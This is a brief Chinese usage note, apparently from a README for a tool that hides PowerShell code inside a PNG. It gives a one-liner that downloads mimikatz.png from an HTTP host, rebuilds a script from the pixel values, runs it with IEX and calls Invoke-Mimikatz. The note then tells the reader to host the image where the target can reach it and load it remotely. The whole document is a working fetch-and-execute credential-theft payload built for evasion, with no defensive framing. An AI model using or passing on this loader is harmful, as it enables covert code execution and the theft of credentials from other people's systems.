##用法
```
sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://192.168.3.210:8000/mimikatz.png"));$o=a Byte[] 1355520;(0..352)|%{foreach($x in(0..3839)){$p=$g.GetPixel($x,$_);$o[$_*3840+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..1352514]));Invoke-Mimikatz
```
```
开启一个目标可以访问的web服务，加载生成的mimikatz.png图片。修改 example.com改成自己的web服务地址。然后进行远程加载即可。
```